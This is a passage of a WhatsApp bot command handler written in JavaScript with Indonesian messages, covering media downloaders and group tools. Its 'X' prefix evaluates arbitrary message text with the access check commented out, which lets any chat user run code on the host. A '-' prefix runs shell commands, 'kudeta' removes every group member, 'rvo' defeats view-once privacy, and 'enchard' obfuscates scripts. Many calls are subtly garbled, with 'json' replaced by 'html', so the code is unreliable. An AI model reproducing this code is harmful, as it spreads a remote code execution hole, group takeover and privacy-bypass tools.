    await justinn.sendMsg("120363373003239606@newsletter", messageOptions)
    await reply(`successfully sent to channel`)
}
break;
case 'idch': case 'cekidch': {
if (!text) return reply("linkchnya mana")
if (!text.includes("https://whatsapp.com/channel/")) return reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await justinn.newsletterMetadata("invite", result)
let tekx = `*ID* : ${res.id}
*Nama :* *${res.name}*
*Total Pengikut :* ${res.subscribers}
*Status :* ${res.state}
*Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: tekx }, 
footer: {
text: "Developer JustinOfficial" }, 
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamshtml": `{"display_text": "copy ID","copy_code": "${res.id}"}`
           },
     ], },},
    }, }, },{ quoted : m });
await justinn.relayMsg( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);
}
break;
case 'tourl': {
    const fetch = require('node-fetch');
    const FormData = require('form-data');
    const q = m.quoted ? m.quoted : m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';
    if ((/image|video|audio/.test(mimetype)) && !/webp/.test(mimetype)) {
        justinn.sendMsg(m.chat, {
            react: {
                text: '⏳',
                key: m.key,
            }
        });

        try {
            const media = await q.download?.();
            const fileSizeInBytes = media.length;
            const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
            const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
            const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
            const form = new FormData();
            form.append('reqtype', 'fileupload');
            let ext = '';
            if (mimetype.includes('video')) ext = '.mp4';
            else if (mimetype.includes('jpeg')) ext = '.jpg';
            else if (mimetype.includes('png')) ext = '.png';
            else if (mimetype.includes('gif')) ext = '.gif';
            else if (mimetype.includes('audio')) ext = '.mp3';
            else ext = '';
            form.append('fileToUpload', media, `file${ext}`);
            const res = await fetch('https://catbox.moe/user/api.php', {
                method: 'POST',
                body: form
            });
            const result = await res.text();
            const url = result.trim();
            const caption = `\n🔗 URL: ${url}\n*Ukuran:* ${fileSize}`;
            let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
interactiveMessage: {
body: {
text: caption }, 
footer: {
text: "Developer JustinOfficial" }, 
  nativeFlowMessage: {
  buttons: [
             {
        "name": "cta_copy",
        "buttonParamshtml": `{"display_text": "copy Url","copy_code": "${url}"}`
           },
     ], },},
    }, }, },{ quoted : catalems });
await justinn.relayMsg( msg.key.remoteJid,msg.message,{ messageId: msg.key.id }
);

        } catch (e) {
            console.error(e);
            reply(`[ ! ] Gagal mengunggah file. Error: ${e.message}`);
        }
    } else {
        reply(`reply .${command}`);
    }
};
break
case 'ytplay':
case 'play': {
  if (!text) {
    return m.reply(`Example: ${prefix} wildflower`)
  }
  try {
    justinn.sendMsg(m.chat, { react: { text: `⏱️`, key: m.key }})
    const yts = require('yt-search')
const nyoba = await yts(text);
const { url, title, description, thumbnail, duration, ago, views, author } = nyoba.all[0];
    const body = `*Judul:* ${title}\n` +
      `*Channel:* ${author.name}\n` +
      `*Durasi:* ${duration}\n` +
      `*Link:* ${url}\n\nKlik *Video* tuk vidio\nKlik *Audio* tuk audio`
    const buttons = [
      {
        buttonId: `${prefix}ytmp4 ${url}`,
        buttonText: { displayText: 'Video' },
        type: 1
      },
      {
        buttonId: `${prefix}ytmp3 ${url}`,
        buttonText: { displayText: 'Audio' },
        type: 1
      }
    ]
    await justinn.sendMsg(m.chat, {
      image: { url: thumbnail },
      caption: body,
      footer: null,
      buttons: buttons,
      headerType: 1,
      viewOnce: true
    }, { quoted: catalems })
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan: '+err)
  }
}
break
        
case 'ytmp3': {
 if (!text) return m.reply(`masukkan link youtube nya, Contoh: ${prefix + command} https://youtube.com/watch?xxx`);
 const url = text.trim();
 const format = 'mp3';
 const regex = /^(https?:\/\/)?(www\.)?(youtube\.com|youtu\.?be)\/.+$/;
 if (!regex.test(url)) {
 return m.reply('link yang anda berikan tidak valid, silahkan masuk kan link yang benar.');
 }
 reply('Tunggu sebentar...');
 try {
 const headers = {
    "accept": "*/*",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "Referer": "https://id.ytmp3.mobi/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  }
const initial = await fetch(`https://d.ymcdn.org/api/v1/init?p=y&23=1llum1n471&_=${Math.random()}`, {headers});
let format = 'mp4';
const init = await initial.html();
const id = url.match(/(?:youtu\.be\/|youtube\.com\/(?:.*v=|.*\/|.*embed\/))([^&?/]+)/)?.[1];
let convertURL = init.convertURL + `&v=${id}&f=${format}&_=${Math.random()}`;
const converts = await fetch(convertURL, {headers});
const convert = await converts.html();
let info = {};
for (let i = 0; i < 3; i++ ){
    let j = await fetch(convert.progressURL, {headers});
    info = await j.html();
    console.log(info);
    if (info.progress == 3) break;
}
const result = {
    url: convert.downloadURL,
    title: info.title
}
await justinn.sendMsg(m.chat, {
            audio: { url: result.url },
            mimetype: 'audio/mp4'
        }, { quoted: m });
} catch {
  reply('aduh kak error nieh..')
}
}
break
case 'ytmp4': {
 if (!text) return m.reply(`masukkan link youtube nya, Contoh: ${prefix + command} https://youtube.com/watch?xxx`);
try {
 const url = text.trim();
const headers = {
    "accept": "*/*",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
    "sec-ch-ua-mobile": "?1",
    "sec-ch-ua-platform": "\"Android\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "Referer": "https://id.ytmp3.mobi/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  }
const initial = await fetch(`https://d.ymcdn.org/api/v1/init?p=y&23=1llum1n471&_=${Math.random()}`, {headers});
let format = 'mp4';
const init = await initial.html();
const id = url.match(/(?:youtu\.be\/|youtube\.com\/(?:.*v=|.*\/|.*embed\/))([^&?/]+)/)?.[1];
let convertURL = init.convertURL + `&v=${id}&f=${format}&_=${Math.random()}`;
const converts = await fetch(convertURL, {headers});
const convert = await converts.html();
let info = {};
for (let i = 0; i < 3; i++ ){
    let j = await fetch(convert.progressURL, {headers});
    info = await j.html();
    console.log(info);
    if (info.progress == 3) break;
}
const result = {
    url: convert.downloadURL,
    title: info.title
}
await justinn.sendMsg(m.chat, { video: { url: result.url } }, { quoted: m });
} catch {
  reply('aduh kak error nieh..')
}
}
break
case "tt":
      case "tiktok":
        {
          if (!text) return reply("link tiktok nya mana");
          if (!text.startsWith("https://")) return m.reply("url tiktok nya mana");
          await tiktokDl(q)
            .then(async (result) => {
              await justinn.sendMsg(m.chat, {
                react: { text: "⏳", key: m.key },
              });
              if (!result.status) return m.reply("Error!");
              if (result.durations == 0 && result.duration == "0 Seconds") {
                let araara = new Array();
                let urutan = 0;
                for (let a of result.data) {
                  let imgsc = await prepareWAMessageMedia(
                    { image: { url: `${a.url}` } },
                    { upload: justinn.waUploadToServer }
                  );
                  await araara.push({
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `Foto Slide Ke *${(urutan += 1)}*`,
                      hasMediaAttachment: true,
                      ...imgsc,
                    }),
                    nativeFlowMessage:
                      proto.Message.InteractiveMessage.NativeFlowMessage.fromObject(
                        {
                          buttons: [
                            {
                              name: "cta_url",
                              buttonParamshtml: `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`,
                            },
                          ],
                        }
                      ),
                  });
                }
                const msgii = await generateWAMessageFromContent(
                  m.chat,
                  {
                    viewOnceMessageV2Extension: {
                      message: {
                        messageContextInfo: {
                          deviceListMetadata: {},
                          deviceListMetadataVersion: 2,
                        },
                        interactiveMessage:
                          proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.fromObject(
                              {
                                text: "*Tiktok Downloader ✅*",
                              }
                            ),
                            carouselMessage:
                              proto.Message.InteractiveMessage.CarouselMessage.fromObject(
                                {
                                  cards: araara,
                                }
                              ),
                          }),
                      },
                    },
                  },
                  { userJid: m.sender, quoted: m }
                );
                await justinn.relayMsg(m.chat, msgii.message, {
                  messageId: msgii.key.id,
                });
              } else {
                let urlVid = await result.data.find(
                  (e) => e.type == "nowatermark_hd" || e.type == "nowatermark"
                );
                await justinn.sendMsg(
                  m.chat,
                  {
                    video: { url: urlVid.url },
                    mimetype: "video/mp4",
                    caption: `*Tiktok Downloader ✅*`,
                  },
                  { quoted: m }
                );
              }
            })
            .catch((e) => console.log(e));
          await justinn.sendMsg(m.chat, { react: { text: "", key: m.key } });
        }
        break;
  case "tiktokmp3":
      case "ttmp3":
        {
          if (!text) return reply("linknya mana");
          if (!text.startsWith("https://"))
            return reply("Link tautan tidak valid");
          await justinn.sendMsg(m.chat, {
            react: { text: "⏳", key: m.key },
          });
          await tiktokDl(text)
            .then(async (res) => {
              if (!res.status) return m.reply("Error! Result Not Found");
              await justinn.sendMsg(
                m.chat,
                { audio: { url: res.music_info.url }, mimetype: "audio/mpeg" },
                { quoted: m }
              );
              await justinn.sendMsg(m.chat, {
                react: { text: "", key: m.key },
              });
            })
            .catch((e) => m.reply("Error! Result Not Found"));
        }
        break;
case "rvo": case "readviewonce": case "•": {
if (!m.quoted) return m.reply("dengan reply pesannya")
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return justinn.sendMsg(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return justinn.sendMsg(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return justinn.sendMsg(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

case "kudeta": {
 if (!isGroup) return reply("Khusus Dalam Grup")
    if (!Access) return reply(mess.ketua)
    let memberFilter = await groupMembers.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
    if (memberFilter.length < 1) return reply("Group Ini Tidak Ada Member . . .")
    await reply("Bye Bye Deck!🤭")
    for (let i of memberFilter) {
    await justinn.groupParticipantsUpdate(m.chat, [i], 'remove')
    await sleep(1000)
    }
    await reply("Kudeta Group By JustinOffc")
    }
    break
        
case 'plays': case 'playspotify': {
  if (!text) return m.reply('Masukkan judul lagu!\nContoh: plays Jakarta Hari Ini');
  const res = await fetch(`https://api.nekorinn.my.id/downloader/spotifyplay?q=${encodeURIComponent(text)}`);
  if (!res.ok) return m.reply('Gagal mengambil data lagu.');
  const data = await res.html();
  if (!data.status) return m.reply('Lagu tidak ditemukan!');
  const { title, artist, duration, imageUrl, link } = data.result.metadata;
  const downloadUrl = data.result.downloadUrl;
  await justinn.sendMsg(m.chat, {
    audio: { url: downloadUrl },
    mimetype: 'audio/mpeg',
    fileName: `${title}.mp3`,
    ptt: true, // true kalau mau dikirim sebagai VN
    contextInfo: {
      externalAdReply: {
        title: title,
        body: `${artist} • ${duration}`,
        mediaType: 2,
        thumbnailUrl: imageUrl,
        renderLargerThumbnail: true,
        sourceUrl: link, 
        showAdAttribution: true
      }
    }
  }, { quoted: m });
}
break
case 'getsw': case "sw": {
    if (m.isGroup) return reply("Khusus Private Chat");

    const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quotedMessage) return reply("komen sw yang ingin di ambil");

    if (quotedMessage.imageMessage) {
        let imageUrl = await justinn.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        return justinn.sendMsg(m.chat, { image: { url: imageUrl } }, { quoted: catalems });
    }

    if (quotedMessage.videoMessage) {
        let videoUrl = await justinn.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        return justinn.sendMsg(m.chat, { video: { url: videoUrl } }, { quoted: catalems });
    }

    return reply("apasi jir");
}
break
case 'hd':{
     if (!text && Access[m.sender]) return reply(mess.owner);
        const FormData = require('form-data');
        const { fromBuffer } = require('file-type');
        if(m.mtype!='imageMessage')return m.reply('mohon kirim gambarnya');
        m.reply('tunggu sedang di proses');
        const fileBuffer = await m.download();
        const fileType = await fromBuffer(fileBuffer);
        if (!fileType || (!fileType.mime.startsWith('image/') && !fileType.mime.startsWith('video/'))) {
          throw new Error('File harus berformat gambar atau video');
        }
        const fileName = `media_${Date.now()}.${fileType.ext}`;
        const formData = new FormData();
        formData.append('file', fileBuffer, {
          filename: fileName,
          contentType: fileType.mime,
        });
        const response = await axios.post('https://api.ryzendesu.vip/api/uploader/ryzencdn', formData, {
          headers: {
            ...formData.getHeaders(),
            accept: 'application/html',
          },
        });
        let imgurl = response.data.url;
        justinn.sendMsg(m.chat,{image:{url:"https://fastrestapis.fasturl.cloud/aiimage/upscale?resize=8&imageUrl="+encodeURIComponent(imgurl)}},{quoted:m})
			}
			break
case 'enchard': {
    if (!m.quoted) return reply("Reply File.js Nya");
    if (mime !== "application/javascript") return reply("Reply File.js Nya");
    let a = await m.quoted.download(),
        b = m.quoted.fileName;
    await fs.writeFileSync(`./@hardenc${b}.js`, a);
    await reply("Memproses encrypt hard....");

    await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${b}.js`).toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const c = "素㗊㖶㗅JustinOfficial㖢จัสตินอย่างเป็นทางการ㖯㖰㗉晴" + "素晴座素JustinOfficial晴จัสตินอย่างเป็นทางการ座素晴難",
                d = x => x.replace(/[^a-zA-Z座JustinOfficial素จัสตินอย่างเป็นทางการ素晴]/g, ''),
                e = y => [...Array(y)].map(() => "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.random() * 52 | 0)).join('');
            return d(c) + e(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1,
        shuffle: { hash: 0, true: 0 },
        stack: true,
        controlFlowFlattening: 1,
        opaquePredicates: 0.9,
        deadCode: 0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    }).then(async f => {
        await fs.writeFileSync(`./@hardenc${b}.js`, f);
        await justinn.sendMsg(
            m.chat,
            { document: fs.readFileSync(`./@hardenc${b}.js`), mimetype: "application/javascript", fileName: b, caption: "Sukses Encrypt File JS! Type: String" },
            { quoted: catalems }
        );
    }).catch(g => m.reply("Error :" + g));
}
break;
default:
if (body.startsWith("~")) {
    if (!Access) return;
    reply('*execute...*')
    function Return(sul) {
        let sat = html.stringify(sul, null, 2);
        let bang = util.format(sat);
        if (sat === undefined) {
            bang = util.format(sul);
        }
        return bang;
    }
    try {
        (async () => {
            try {
                const result = await eval(`(async () => { return ${text} })()`);
                reply(Return(result));
            } catch (e) {
                reply(util.format(e));
            }
        })();
    } catch (e) {
        reply(util.format(e));
    }
}
			
if (budy.startsWith("X")) {
 // if (!Access) return
    await reaction(m.chat, '⏳')
    try {
        let evaled = await eval(q);
        if (typeof evaled !== "string") evaled = util.inspect(evaled);
        await m.reply(evaled);
    } catch (e) {
        await m.reply(`Error: ${String(e)}`);
    }
}
                
if (budy.startsWith('-')) {
    if (!Access) return
    await reaction(m.chat, '⏳')
    if (text == "rm -rf *") return m.reply("😹")
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(`${err}`)
        if (stdout) return m.reply(stdout)  
    })
}
 
}
} catch (err) {
        console.log(require("util").format(err));
    }
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
